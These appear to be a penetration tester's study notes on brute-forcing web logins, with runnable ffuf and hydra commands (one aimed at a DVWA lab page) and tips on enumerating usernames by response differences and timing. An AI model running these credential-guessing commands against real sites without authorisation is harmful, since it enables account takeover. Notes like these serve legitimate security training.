**ffuf**

- Save request “copy to file” from burp - Replace “password” param with “FUZZ”
- Run with no filter, determine invalid response size, add `fs <SIZE>` , re-run command
```Python
ffuf -request r.txt -fs <SIZE> -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt:FUZZ
```
**fuff - fuzz all permutations of multiple parameters (clusterbomb)**

- Modify the request with two keywords, append them to the proper wordlists
```Python
ffuf -request r.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt:FUZZPASS -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER
```
**hydra**
```Python
hydra -V -L ../wordlists/users.txt -P ../wordlists/pass.txt 192.168.187.133 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie\: PHPSESSID=XXXXX; security=low"
```
## User Enumeration

- Check if response is different for failed username vs failed password
#### Timing technique:

- Attempt usernames with an extremely long password
	- Does the application take longer to check the password when the username is valid? 
	- Check response times !
